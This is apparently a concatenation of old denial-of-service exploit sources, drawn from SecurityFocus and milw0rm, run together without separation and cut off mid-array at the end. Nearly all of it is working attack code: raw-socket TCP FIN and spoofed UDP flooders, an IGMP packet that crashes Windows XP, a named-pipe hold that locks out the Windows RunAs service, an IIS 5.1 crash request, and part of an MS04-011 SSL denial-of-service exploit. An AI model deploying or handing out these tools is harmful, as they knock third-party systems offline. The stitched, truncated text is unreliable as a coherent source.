Successful exploitation of this vulnerability could render the system useless.

/*
 stream3.c - TCP FIN packet flooder
 patched from stream.c by 3APA3A, 2000
 3APA3A@security.nnov.ru
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <strings.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#ifndef __USE_BSD
#define __USE_BSD
#endif
#ifndef __FAVOR_BSD
#define __FAVOR_BSD
#endif
#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>

#ifdef LINUX
#define FIX(x)  htons(x)
#else
#define FIX(x)  (x)
#endif

struct ip_hdr {
    u_int       ip_hl:4,                /* header length in 32 bit words */
                ip_v:4;                 /* ip version */
    u_char      ip_tos;                 /* type of service */
    u_short     ip_len;                 /* total packet length */
    u_short     ip_id;                  /* identification */
    u_short     ip_off;                 /* fragment offset */
    u_char      ip_ttl;                 /* time to live */
    u_char      ip_p;                   /* protocol */
    u_short     ip_sum;                 /* ip checksum */
    u_long      saddr, daddr;           /* source and dest address */
};

struct tcp_hdr {
    u_short     th_sport;               /* source port */
    u_short     th_dport;               /* destination port */
    u_long      th_seq;                 /* sequence number */
    u_long      th_ack;                 /* acknowledgement number */
    u_int       th_x2:4,                /* unused */
                th_off:4;               /* data offset */
    u_char      th_flags;               /* flags field */
    u_short     th_win;                 /* window size */
    u_short     th_sum;                 /* tcp checksum */
    u_short     th_urp;                 /* urgent pointer */
};

struct tcpopt_hdr {
    u_char  type;                       /* type */
    u_char  len;                                /* length */
    u_short value;                      /* value */
};

struct pseudo_hdr {                     /* See RFC 793 Pseudo Header */
    u_long saddr, daddr;                        /* source and dest address */
    u_char mbz, ptcl;                   /* zero and protocol */
    u_short tcpl;                       /* tcp length */
};

struct packet {
    struct ip/*_hdr*/ ip;
    struct tcphdr tcp;
/* struct tcpopt_hdr opt; */
};

struct cksum {
    struct pseudo_hdr pseudo;
    struct tcphdr tcp;
};

struct packet packet;
struct cksum cksum;
struct sockaddr_in s_in;
u_short dstport, pktsize, pps;
u_long dstaddr;
int sock;

void usage(char *progname)
{
    fprintf(stderr, "Usage: %s <dstaddr> <dstport> <pktsize> <pps>\n", 
progname);
    fprintf(stderr, "    dstaddr  - the target we are trying to attack.\n");
    fprintf(stderr, "    dstport  - the port of the target, 0 = random.\n");
    fprintf(stderr, "    pktsize  - the extra size to use.  0 = normal 
syn.\n");
    exit(1);
}

/* This is a reference internet checksum implimentation, not very fast */
inline u_short in_cksum(u_short *addr, int len)
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;

     /* Our algorithm is simple, using a 32 bit accumulator (sum), we add
      * sequential 16 bit words to it, and at the end, fold back all the
      * carry bits from the top 16 bits into the lower 16 bits. */

     while (nleft > 1)  {
         sum += *w++;
         nleft -= 2;
     }

     /* mop up an odd byte, if necessary */
     if (nleft == 1) {
         *(u_char *)(&answer) = *(u_char *) w;
         sum += answer;
     }

     /* add back carry outs from top 16 bits to low 16 bits */
     sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
     sum += (sum >> 16);                /* add carry */
     answer = ~sum;                     /* truncate to 16 bits */
     return(answer);
}

u_long lookup(char *hostname)
{
    struct hostent *hp;

    if ((hp = gethostbyname(hostname)) == NULL) {
       fprintf(stderr, "Could not resolve %s.\n", hostname);
       exit(1);
    }

    return *(u_long *)hp->h_addr;
}


void flooder(void)
{
    struct timespec ts;
    int i;


    memset(&packet, 0, sizeof(packet));

    ts.tv_sec                   = 0;
    ts.tv_nsec                  = 10;

    packet.ip.ip_hl             = 5;
    packet.ip.ip_v              = 4;
    packet.ip.ip_p              = IPPROTO_TCP;
    packet.ip.ip_tos            = 0x08;
    packet.ip.ip_id             = rand();
    packet.ip.ip_len            = FIX(sizeof(packet));
    packet.ip.ip_off            = 0; /* IP_DF? */
    packet.ip.ip_ttl            = 255;
    packet.ip.ip_dst.s_addr     = dstaddr;
    packet.ip.ip_src.s_addr     = random();
    packet.ip.ip_sum         	= 0;
    packet.tcp.th_sum           = 0;

    packet.tcp.th_win           = htons(16384);
    packet.tcp.th_seq           = random();
    packet.tcp.th_ack           = 0;
    packet.tcp.th_off           = 5; /* 5 */
    packet.tcp.th_urp           = 0;
    packet.tcp.th_ack 		= rand();
    packet.tcp.th_flags 	= TH_ACK|TH_FIN;
    packet.tcp.th_sport 	= rand();
    packet.tcp.th_dport         = dstport?htons(dstport):rand();

/*
    packet.opt.type             = 0x02;
    packet.opt.len              = 0x04;
    packet.opt.value            = htons(1460);
*/


    s_in.sin_family             = AF_INET;
    s_in.sin_port               = packet.tcp.th_dport;
    s_in.sin_addr.s_addr	= dstaddr;

    cksum.pseudo.daddr          = dstaddr;
    cksum.pseudo.saddr		= packet.ip.ip_src.s_addr;
    cksum.pseudo.mbz            = 0;
    cksum.pseudo.ptcl           = IPPROTO_TCP;
    cksum.pseudo.tcpl           = htons(sizeof(struct tcphdr));
    cksum.tcp                   = packet.tcp;

    packet.ip.ip_sum            = in_cksum((void *)&packet.ip, 20);
    packet.tcp.th_sum           = in_cksum((void *)&cksum, sizeof(cksum));


    for(i=0;;++i) {


       if (sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr 
*)&s_in, sizeof(s_in)) < 0)
          perror("jess");

    }
}

int main(int argc, char *argv[])
{
    int on = 1;

    printf("stream3.c v0.01 - TCP FIN Packet Flooder\n modified by 3APA3A@security.nnov.ru\n");

    if ((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
       perror("socket");
       exit(1);
    }

    setgid(getgid()); setuid(getuid());

    if (argc < 4)
       usage(argv[0]);

    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)) <  0) {
       perror("setsockopt");
       exit(1);
    }

    srand((time(NULL) ^ getpid()) + getppid());

    printf("\nResolving IPs..."); fflush(stdout);

    dstaddr     = lookup(argv[1]);
    dstport     = atoi(argv[2]);
    pktsize     = atoi(argv[3]);

    printf("Sending..."); fflush(stdout);

    flooder();

    return 0;
}source: http://www.securityfocus.com/bid/3291/info

The Windows 2000 RunAs service allows an application or service to be executed as a different user. It is accessed by holding down the shift key and right mouse clicking on an icon, then selecting 'Run as...' from the context menu.

When the service is invoked, it creates a named pipe session with the specified server for authentication of credentials. The RunAs service only allows one instance of this session at a time. If a client were to create this pipe on the server without requesting any service, other clients would be unable to connect to this service. 

// radix1112200103.c - Camisade - Team RADIX - 11-12-2001
//
// Camisade (www.camisade.com) is not responsible for the use or
// misuse of this proof of concept source code.

#define WIN32_LEAN_AND_MEAN
#define UNICODE
#define _UNICODE

#include <windows.h>
#include <tchar.h>

#include <stdio.h>
#include <conio.h>

#define SECLOGON_PIPE   _T("\\\\.\\pipe\\secondarylogon")


void main()
{
   HANDLE hPipe;

   hPipe = CreateFile(SECLOGON_PIPE, GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
   if (hPipe == INVALID_HANDLE_VALUE)
   {
      printf("Unable to open pipe, error %d\n", GetLastError());
      return;
   }

   printf("Connected to pipe.  Press any key to disconnect.\n");
   getche();

   CloseHandle(hPipe);
}

/* MS06-007 Denial of Service POC exploit
   created by Firestorm, based on zloSend.exe win32 exploit (http://www.securitylab.ru/poc/264136.php)
   Tested on Windows XP SP2 as victim (compiled/runned on Fedore Core 4 x86)
   FOR EDUCATIONAL PURPOSE ONLY !!!      */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>


struct iphdr
{
  unsigned char ihl:4, version:4, tos;
  unsigned short tot_len, id, frag_off;
  unsigned char ttl, protocol;
  unsigned short check;
  unsigned int saddr, daddr;
  unsigned int options1;
  unsigned int options2;
};


struct igmpv3_query {
        unsigned char type;
        unsigned char code;
        unsigned short csum;
        unsigned int group;
        unsigned char qqic;
        unsigned char qrv:3,
        suppress:1,
        resv:4;
        unsigned short nsrcs;
        unsigned int srcs[1];
};


unsigned short in_chksum(unsigned short *, int);
long resolve(char *);


long resolve(char *host)
{
  struct hostent *hst;
  long addr;


  hst = gethostbyname(host);
  if (hst == NULL)
    return(-1);


  memcpy(&addr, hst->h_addr, hst->h_length);


  return(addr);
}


int main(int argc, char *argv[])
{
  struct sockaddr_in dst;
  struct iphdr *ip;
  struct igmpv3_query *igmp;
  long daddr, saddr;
  int s, i=0, c, len, one=1;
  char buf[1500];


  if (argc < 3)
  {
    printf("MS06-007 Denial of Service POC exploit by Firestorm\n");
    printf("Usage: %s <src> <dst>\n", *argv);
    return(1);
  }


  daddr = resolve(argv[2]);
  saddr = resolve(argv[1]);


  memset(buf, 0, 1500);
  ip = (struct iphdr *)&buf;
  igmp = (struct igmpv3_query*)&buf[sizeof(struct iphdr)];


  dst.sin_addr.s_addr = daddr;
  dst.sin_family = AF_INET;


  ip->ihl = 7;
  ip->version = 4;
  ip->tos = 0;
  ip->tot_len = htons(44);
  ip->id = htons(18277);
  ip->frag_off=0;
  ip->ttl = 128;
  ip->protocol = IPPROTO_IGMP;
  ip->check = in_chksum((unsigned short *)ip, sizeof(struct iphdr));
  ip->saddr = saddr;
  ip->daddr = daddr;
  ip->options1 = 0;
  ip->options2 = 0;
  igmp->type = 0x11;
  igmp->code = 5;
  igmp->group=inet_addr("224.0.0.1");
  igmp->qqic=0;
  igmp->qrv=0;
  igmp->suppress=0;
  igmp->resv=0;
  igmp->nsrcs=htons(1);
  igmp->srcs[0]=daddr;

  igmp->csum = 0; //For computing the checksum, the Checksum field is set to zero.
  igmp->csum=in_chksum((unsigned short *)igmp, sizeof(struct igmpv3_query));

  s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (s == -1)
    return(1);

  printf("Sending IGMP packet: %s -> %s\n", argv[1], argv[2]);

      if (sendto(s,&buf,44,0,(struct sockaddr *)&dst,sizeof(struct sockaddr_in)) == -1)
      {
        perror("Error sending packet");
        exit(-1);
      }

  return(0);
}


unsigned short in_chksum(unsigned short *addr, int len)
{
   register int nleft = len;
   register int sum = 0;
   u_short answer = 0;

   while (nleft > 1) {
      sum += *addr++;
      nleft -= 2;
   }


   if (nleft == 1) {
      *(u_char *)(&answer) = *(u_char *)addr;
      sum += answer;
   }


   sum = (sum >> 16) + (sum & 0xffff);
   sum += (sum >> 16);
   answer = ~sum;
   return(answer);
}

// milw0rm.com [2006-03-22]
source: http://www.securityfocus.com/bid/8543/info

A remote denial of service vulnerability has been reported to affect Microsoft Windows 98. It is reportedly possible to reproduce this condition by sending a fragmented flood of spoofed UDP packets to a vulnerable system. This will reportedly consume system resources and may ultimately result in the system locking up until the attack desists. 

/*
[------------------------------------------------------------------------]
[-- nologin - nologin - nologin -=]   [=- nologin - nologin - nologin  --]
[------------------------------------------------------------------------]
[-- Genre  : Denial of Service(DoS)                                    --]
[-- Name   : augustiner.c                                              --]
[-- Desc   : Udp flooder. Freezing Windows 98(not SE).                 --]
[--        :              DoS'ing Zonealarm                            --]
[-- Url    : www.nologin.org                                           --]
[-- Use    : gcc -o augustiner augustiner.c; ./augustiner              --]
[------------------------------------------------------------------------]
[-- Author : |WARL0RD|                                                 --]
[-- Date   : 8/2003                                                    --]
[-- Mod    : 9/2003                                                    --]
[------------------------------------------------------------------------]
[-- Comment: Win98 may be out of date, but it's still in widespread    --]
[--          use.                                                      --]
[--          This tool is for educational purposes only of course.     --]
[--          As of today this vuln seems unpatched.                    --]
[--          Ok after slightly modifying this code it finally has      --]
[--          the intended original effect of DoS'ing Zonealarm.        --]
[--          So augustiner.c is 2 DoS in 1. Congrats to Special        --]
[--          Discount Day.                                             --]
[------------------------------------------------------------------------]
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <netdb.h>
#include <errno.h>


#define PSEUHDR         sizeof(struct pseudohdr)
#define IP              struct iphdr
#define UDP             struct udphdr

extern int errno;


/***********************************************************/
void banner() {
        printf("\n\taugustiner.c\n");
        printf("\tVersion 1.1\n");
        printf("(c) warlord OF nologin.org\n");
        printf("Check www.nologin.org\n");
        printf("-----------------------------------\n");
return;
}

/**********************************************************/

void usage(char *name) {
        printf("Usage: %s <target> <source>\n",name);
        printf("The source address will be spoofed to what you specify\n");
        printf("Example: ./augustiner 192.168.0.1 www.microsoft.com\n");
exit(0);
}



/************************************************************/

unsigned short ipChecksum(unsigned short *ptr, int nbytes)
{
register long sum;
register u_short answer;
u_short oddbyte;

sum = 0;

while (nbytes > 1)
  {
    sum += *ptr++;
    nbytes -= 2;
  }

if (nbytes == 1)
  {
    oddbyte = 0;
    *((u_char *) & oddbyte) = *(u_char *) ptr;
    sum += oddbyte;
  }

sum = (sum >> 16) + (sum & 0xffff);
sum += (sum >> 16);
answer = ~sum;

return (answer);
}



/*****************************************************************/




int sendUDP(int sock, char *dhost,char *shost)
{
  unsigned int packetLen, minimalLength;
  unsigned char packet[(packetLen = sizeof(IP) + sizeof(UDP)+100)];
  unsigned short ppp=0;
  IP *iphdr = (IP *)packet;
  UDP *udphdr = (UDP *)((unsigned char *)packet + sizeof(IP));
  struct sockaddr_in s;
  struct hostent *he;


 srand(time(NULL));
 unsigned char minimalip[(minimalLength = 12 + sizeof(UDP))];
 memset(&s, 0, sizeof(s));
 memset(packet, 0, packetLen);
 memset(minimalip, 0, minimalLength);

 if((he=gethostbyname(shost))==NULL)
   {
     *((unsigned long *)((unsigned char *)minimalip+0)) = inet_addr(shost);
   }
  else
   {
     *((unsigned long*)((unsigned char *)minimalip+0)) = *((char *)he->h_addr);
   }


 if((he=gethostbyname(dhost))==NULL)
   {
     *((unsigned long *)((unsigned char *)minimalip+0)) = inet_addr(dhost);
   }
  else
   {
     *((unsigned long*)((unsigned char *)minimalip+0)) = *((char *)he->h_addr);
   }

 *((unsigned char *)((unsigned char *)minimalip+8)) = 0;
 *((unsigned char *)((unsigned char *)minimalip+9)) = IPPROTO_UDP;
 *((unsigned short *)((unsigned char *)minimalip+10)) = htons(packetLen - sizeof(IP));
 iphdr->version       = 4;
 iphdr->ihl      = 5;
 iphdr->id      = 60000;
 iphdr->frag_off = 0;

// iphdr->frag_off = 2050;

 if ((iphdr->saddr = inet_addr(shost)) == (unsigned long)-1)
  {
    if (!(he = gethostbyname(shost)))
      {
        printf("Couldn't resolve the src host\n");
        exit(0);
      }
    memcpy(&iphdr->saddr, he->h_addr, sizeof(iphdr->saddr));
  }

 if ((iphdr->daddr = inet_addr(dhost)) == (unsigned long)-1)
  {
    if (!(he = gethostbyname(dhost)))
      {
        printf("Couldn't resolve the dst host\n");
        exit(0);
      }
    memcpy(&iphdr->daddr, he->h_addr, sizeof(iphdr->daddr));
  }

 iphdr->protocol       = IPPROTO_UDP;
 iphdr->ttl     = 255;
 iphdr->tot_len     = packetLen;
 iphdr->check     = ipChecksum((u_short *)iphdr, sizeof(IP));
 s.sin_family      = AF_INET;

 if((he=gethostbyname(dhost))==NULL)
   {
     s.sin_addr.s_addr=inet_addr(dhost);
   }
  else
   {
     s.sin_addr=*((struct in_addr *)he->h_addr);
   }

while(1)
  {
    ppp++;
    udphdr->source = htons(20000);
    udphdr->dest =   htons(ppp);
    udphdr->len   = htons(8);
    udphdr->check = 0;

    sendto(sock, packet, packetLen, 0, (struct sockaddr *)&s, sizeof(s));
  }
 return 0;
}


/***********************************************************/



int main(int argc, char **argv) {
int sock, optval=1;

        banner();

        if(argc<3) usage(argv[0]);

        sock = socket(AF_INET,SOCK_RAW,IPPROTO_UDP);
        setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&optval,sizeof(optval));

        printf("Flooding %s with udp packets.\n",argv[1]);
        printf("Press Ctrl+C to stop\n");

        sendUDP(sock, argv[1], argv[2]);

        close(sock);

exit(0);
}

/*****************************************************************

Microsoft IIS 5.1 Remote D.o.S Exploit by Kozan

Application: Microsoft IIS (Internet Information Server)
Vendor: Microsoft - http://www.microsoft.com/

Discovered by: Inge Henriksen
Exploit Coded by: Kozan
Credits to ATmaCA,  Inge Henriksen
Web: www.spyinstructors.com
Mail: kozan@spyinstructors.com


Vulnerable:
Microsoft® Internet Information Server® V5.1

Not vulnerable:
Microsoft® Internet Information Server® V5.0
Microsoft® Internet Information Server® V6.0


Only folders with Execute Permissions set to 'Scripts & Executables'
are affected, such as the '_vti_bin' directory.

inetinfo.exe will be crashed after exploitation finished successfuly.

Usage: iis51dos.exe [Target Url or IP]

*****************************************************************/

#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")


char *HttpHeader(char *pszHost)
{
       char szHeader[1000];

       wsprintf(       szHeader,       "POST /_vti_bin/.dll/*/~0 HTTP/1.1\r\n"
                                                       "Content-Type: application/x-www-form-urlencoded\r\n"
                                                       "Host: %s\r\n"
                                                       "Content-Length: 0\r\n\r\n"
                                               ,       pszHost
                       );

       return szHeader;
}


int main(int argc, char *argv[])
{
       fprintf(stdout, "\n\nMicrosoft IIS 5.1 Remote D.o.S Exploit by Kozan\n"
                                       "Bug Discovered by: Inge Henriksen\n"
                                       "Exploit Coded by: Kozan\n"
                                       "Credits to ATmaCA, Inge Henriksen\n"
                                       "www.spyinstructors.com - kozan@spyinstructors.com\n\n"
                       );

       if( argc != 2 )
       {
               fprintf(stderr, "\n\nUsage:\t%s [WebSiteUrl]\n\n", argv[0]);
               return -1;
       }

       WSADATA wsaData;
       struct hostent *pTarget;
       struct sockaddr_in addr;
       SOCKET sock;

       char szHeader[1000], szWebUrl[1000];

       lstrcpy(szWebUrl, argv[1]);
       lstrcpy(szHeader, HttpHeader(szWebUrl));

       if( WSAStartup(0x0101,&wsaData) < 0 )
       {
               fprintf(stderr, "Winsock error!\n");
               return -1;
       }

       sock = socket(AF_INET,SOCK_STREAM,0);

       if( sock == -1 )
       {
               fprintf(stderr, "Socket error!\n");
               return -1;
       }

       if( (pTarget = gethostbyname(szWebUrl)) == NULL )
       {
               fprintf(stderr, "Address resolve error!\n");
               return -1;
       }

       memcpy(&addr.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
       addr.sin_family = AF_INET;
       addr.sin_port = htons(80);
       memset(&(addr.sin_zero), '\0', 8);

       fprintf(stdout, "Please wait while connecting...\n");

       if( connect( sock, (struct sockaddr*)&addr, sizeof(struct sockaddr) ) == -1 )
       {
               fprintf(stderr, "Connection failed!\n");
               closesocket(sock);
               return -1;
       }

       fprintf(stdout, "Connected.\n\n");

       fprintf(stdout, "Please wait while sending DoS request headers...\n\n");

       for( int i=0; i<4; i++ )
       {
               fprintf(stdout, "Sending %d. request...\n", i+1);

               if( send(sock, szHeader, lstrlen(szHeader),0) == -1 )
               {
                       fprintf(stderr, "%d. DoS request header could not sent!\n", i+1);
                       closesocket(sock);
                       return -1;
               }

               fprintf(stdout, "%d. request sent.\n\n", i+1);
       }

       fprintf(stdout, "Operation completed...\n");
       closesocket(sock);
       WSACleanup();


       return 0;
}

// milw0rm.com [2005-12-19]
/*
* Microsoft SSL Remote Denial of Service
* MS04-011
*
* Tested succesfully against IIS 5.0 with SSL.
*
* David Barroso Berrueta dbarroso s21sec com
* Alfredo Andres Omella aandres s21sec com
*
* S21sec - www s21sec com
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <string.h>
#include <arpa/nameser.h>
#include <errno.h>

int exist_host( char *, u_long *);
void init_hello(void);


/* begin cipher suites: */
char cipher_suites[] = /* 52 */
{0x00,0x39,0x00,0x38,0x00,0x35,0x00,0x16,0x00,0x13,0x00,0x0A,0x00,0x33,0x00
,0x32,0x00,0x2F,0x00,0x66,0x00,0x05,0x00,0x04,0x00,0x63,0x00,0x62,0x00,0x61
,0x00,0x15,0x00,0x12,0x00,0x09,0x00,0x65,0x00,0x64,0x00,0x60,0x00,0x14,0x00
,0x11,0x00,0x08,0x00,0x06,0x00,0x03};

/* begin binary data: */
char bin_data[] = /* 1308 */
{0x16,0x03,0x00,0x03,0xB8,0x01,0x00,0x03,0xB4,0x00,0x03,0xB1,0x00,0x03,0xAE
,0x30,0x82,0x03,0xAA,0x30,0x82,0x03,0x13,0xA0,0x03,0x02,0x01,0x02,0x02,0x01
,0x00,0x30,0x0D,0x06,0x09,0x2A,0x86,0x48,0x86,0xF7,0x0D,0x01,0x01,0x04,0x05
,0x00,0x30,0x81,0x9B,0x31,0x0B,0x30,0x09,0x06,0x03,0x55,0x04,0x06,0x13,0x02
,0x45,0x53,0x31,0x11,0x30,0x0F,0x06,0x03,0x55,0x04,0x08,0x13,0x08,0x50,0x61
,0x6C,0x65,0x6E,0x63,0x69,0x61,0x31,0x14,0x30,0x12,0x06,0x03,0x55,0x04,0x07
,0x13,0x0B,0x54,0x6F,0x72,0x72,0x65,0x62,0x6C,0x61,0x63,0x6F,0x73,0x31,0x0F
,0x30,0x0D,0x06,0x03,0x55,0x04,0x0A,0x13,0x06,0x53,0x32,0x31,0x73,0x65,0x63
,0x31,0x19,0x30,0x17,0x06,0x03,0x55,0x04,0x0B,0x13,0x10,0x77,0x77,0x77,0x2E
,0x77,0x61,0x73,0x61,0x68,0x65,0x72,0x6F,0x2E,0x6F,0x72,0x67,0x31,0x0F,0x30
,0x0D,0x06,0x03,0x55,0x04,0x03,0x13,0x06,0x53,0x32,0x31,0x73,0x65,0x63,0x31
,0x26,0x30,0x24,0x06,0x09,0x2A,0x86,0x48,0x86,0xF7,0x0D,0x01,0x09,0x01,0x16
,0x17,0x64,0x65,0x76,0x65,0x6C,0x6F,0x70,0x65,0x72,0x73,0x40,0x77,0x61,0x73
,0x61,0x68,0x65,0x72,0x6F,0x2E,0x6F,0x72,0x67,0x30,0x1E,0x17,0x0D,0x30,0x34
,0x30,0x34,0x31,0x33,0x30,0x38,0x33,0x30,0x35,0x39,0x5A,0x17,0x0D,0x30,0x35
,0x30,0x34,0x31,0x33,0x30,0x38,0x33,0x30,0x35,0x39,0x5A,0x30,0x81,0x9B,0x31
,0x0B,0x30,0x09,0x06,0x03,0x55,0x04,0x06,0x13,0x02,0x45,0x53,0x31,0x11,0x30
,0x0F,0x06,0x03,0x55,0x04,0x08,0x13,0x08,0x50,0x61,0x6C,0x65,0x6E,0x63,0x69
,0x61,0x31,0x14,0x30,0x12,0x06,0x03,0x55,0x04,0x07,0x13,0x0B,0x54,0x6F,0x72
,0x72,0x65,0x62,0x6C,0x61,0x63,0x6F,0x73,0x31,0x0F,0x30,0x0D,0x06,0x03,0x55
,0x04,0x0A,0x13,0x06,0x53,0x32,0x31,0x73,0x65,0x63,0x31,0x19,0x30,0x17,0x06
,0x03,0x55,0x04,0x0B,0x13,0x10,0x77,0x77,0x77,0x2E,0x77,0x61,0x73,0x61,0x68
,0x65,0x72,0x6F,0x2E,0x6F,0x72,0x67,0x31,0x0F,0x30,0x0D,0x06,0x03,0x55,0x04
,0x03,0x13,0x06,0x53,0x32,0x31,0x73,0x65,0x63,0x31,0x26,0x30,0x24,0x06,0x09
,0x2A,0x86,0x48,0x86,0xF7,0x0D,0x01,0x09,0x01,0x16,0x17,0x64,0x65,0x76,0x65
,0x6C,0x6F,0x70,0x65,0x72,0x73,0x40,0x77,0x61,0x73,0x61,0x68,0x65,0x72,0x6F
,0x2E,0x6F,0x72,0x67,0x30,0x81,0x9F,0x30,0x0D,0x06,0x09,0x2A,0x86,0x48,0x86
,0xF7,0x0D,0x01,0x01,0x01,0x05,0x00,0x03,0x81,0x8D,0x00,0x30,0x81,0x89,0x02
,0x81,0x81,0x00,0xC4,0x76,0x8B,0x8E,0x3A,0x00,0x70,0xD7,0xA0,0x36,0xCF,0xFC
,0xE8,0xBF,0x2E,0x18,0x83,0xB0,0xC5,0x7C,0x64,0x2F,0xF7,0xA8,0x31,0x70,0xF4
,0xBF,0x31,0x1D,0x81,0x57,0xD7,0x37,0xF9,0xDD,0x7C,0x4E,0xDF,0xB9,0xE2,0xAF
,0x69,0x79,0xB3,0xD5,0x59,0x91,0xED,0x27,0xF0,0x44,0x0A,0xC4,0x3C,0x43,0xF9
,0xE8,0x03,0xAE,0x10,0xDD,0x8B,0x52,0xC0,0x33,0xD7,0x9D,0x6D,0xE3,0xFF,0x03
,0x4B,0x89,0x2F,0x1A,0x73,0xCD,0x11,0x8A,0xD1,0xC1,0x40,0x21,0x2F,0x57,0x22
,0x23,0xF5,0x30,0xF8,0x8A,0x0B,0x02,0xDC,0x31,0xB5,0x4C,0xD9,0xCC,0x5A,0x83
,0xD8,0x7F,0x0A,0xC1,0x5F,0xA6,0x43,0x6C,0xD4,0xEC,0x9F,0x2F,0xEC,0x9A,0x01
,0x63,0x6D,0x30,0x11,0xB9,0xDA,0x73,0x53,0xC2,0x92,0x6B,0x02,0x03,0x01,0x00
,0x01,0xA3,0x81,0xFB,0x30,0x81,0xF8,0x30,0x1D,0x06,0x03,0x55,0x1D,0x0E,0x04
,0x16,0x04,0x14,0xE9,0x66,0x7B,0x58,0x23,0xA2,0x35,0x0F,0xD4,0x31,0x7C,0xAE
,0xC6,0x87,0x64,0x38,0x4E,0xAB,0xAA,0x58,0x30,0x81,0xC8,0x06,0x03,0x55,0x1D
,0x23,0x04,0x81,0xC0,0x30,0x81,0xBD,0x80,0x14,0xE9,0x66,0x7B,0x58,0x23,0xA2
,0x35,0x0F,0xD4,0x31,0x7C,0xAE,0xC6,0x87,0x64,0x38,0x4E,0xAB,0xAA,0x58,0xA1
,0x81,0xA1,0xA4,0x81,0x9E,0x30,0x81,0x9B,0x31,0x0B,0x30,0x09,0x06,0x03,0x55
,0x04,0x06,0x13,0x02,0x45,0x53,0x31,0x11,0x30,0x0F,0x06,0x03,0x55,0x04,0x08
,0x13,0x08,0x50,0x61,0x6C,0x65,0x6E,0x63,0x69,0x61,0x31,0x14,0x30,0x12,0x06
,0x03,0x55,0x04,0x07,0x13,0x0B,0x54,0x6F,0x72,0x72,0x65,0x62,0x6C,0x61,0x63
,0x6F,0x73,0x31,0x0F,0x30,0x0D,0x06,0x03,0x55,0x04,0x0A,0x13,0x06,0x53,0x32
,0x31,0x73,0x65,0x63,0x31,0x19,0x30,0x17,0x06,0x03,0x55,0x04,0x0B,0x13,0x10
,0x77,0x77,0x77,0x2E,0x77,0x61,0x73,0x61,0x68,0x65,0x72,0x6F,0x2E,0x6F,0x72
,0x67,0x31,0x0F,0x30,0x0D,0x06,0x03,0x55,0x04,0x03,0x13,0x06,0x53,0x32,0x31
,0x73,0x65,0x63,0x31,0x26,0x30,0x24,0x06,0x09,0x2A,0x86,0x48,0x86,0xF7,0x0D
,0x01,0x09,0x01,0x16,0x17,0x64,0x65,0x76,0x65,0x6C,0x6F,0x70,0x65,0x72,0x73
,0x40,0x77,0x61,0x73,0x61,0x68,0x65,0x72,0x6F,0x2E,0x6F,0x72,0x67,0x82,0x01
,0x00,0x30,0x0C,0x06,0x03,0x55,0x1D,0x13,0x04,0x05,0x30,0x03,0x01,0x01,0xFF
,0x30,0x0D,0x06,0x09,0x2A,0x86,0x48,0x86,0xF7,0x0D,0x01,0x01,0x04,0x05,0x00
,0x03,0x81,0x81,0x00,0x75,0x2D,0x19,0xE1,0xAD,0x19,0x77,0x75,0xCB,0xCB,0x76
,0x88,0x38,0xF8,0xD5,0x27,0xD2,0xAB,0x79,0x7F,0x39,0x4A,0x9C,0x56,0x9A,0x5F
,0xCA,0x0C,0xAC,0x21,0x16,0xF6,0xF5,0xE2,0xE8,0xE1,0xB9,0xC2,0x29,0x25,0x52
,0xAF,0xF1,0x83,0x28,0xB0,0x00,0x7B,0xA6,0x12,0xE6,0xC7,0x4D,0x93,0x0C,0x7E
,0xD0,0x83,0x1E,0x59,0x4D,0xEB,0xDF,0xDC,0xED,0x05,0x01,0x84,0xC7,0x92,0x52
,0x65,0x26,0xAA,0x08,0x45,0x65,0x5A,0xB6,0x33,0xDC,0x2A,0xBB,0x85,0x26,0x14
,0x9C,0xBD,0xED,0xFB,0xBB,0x53,0xB3,0xA4,0xB3,0x27,0xC7,0x25,0x02,0xD4,0x0D
,0xAA,0x5E,0x2F,0x53,0xD4,0x1F,0xFB,0xFE,0x07,0x24,0xC6,0x27,0x65,0x59,0x35
,0x43,0x7D,0x28,0xD7,0x42,0x11,0x57,0x84,0x17,0x0D,0x99,0x2B,0x16,0x03,0x00
,0x00,0x84,0x10,0x00,0x00,0x80,0x2A,0x68,0x9A,0xBC,0x58,0x4D,0xA8,0xDD,0xD3
,0x95,0xC0,0xF2,0x70,0x98,0xC8,0xBE,0xE5,0x0C,0x0D,0xC1,0x40,0xD5,0x95,0x17
,0xD6,0xBF,0x04,0x2B,0xEB,0x18,0x54,0x2D,0x9F,0x72,0x55,0xCA,0x84,0x26,0xF2
,0xAF,0xFA,0x13,0xE2,0x15,0x9A,0x88,0x31,0x92,0xC5,0x1E,0xB7,0xF8,0xD7,0x2D
,0x97,0x9A,0x46,0xEF,0x73,0xFF,0xB3,0xA1,0x92,0x0B,0x64,0xC5,0xC8,0xA9,0xBB
,0x24,0xE5,0xD2,0x4B,0x49,0x0D,0x1B,0xB1,0x5F,0xE4,0x5E,0x2E,0x60,0x29,0x48
,0xB5,0xC2,0x1C,0xA5,0x53,0x7B,0x7B,0x55,0xFD,0x1A,0xAF,0x89,0x0B,0x0B,0xB4
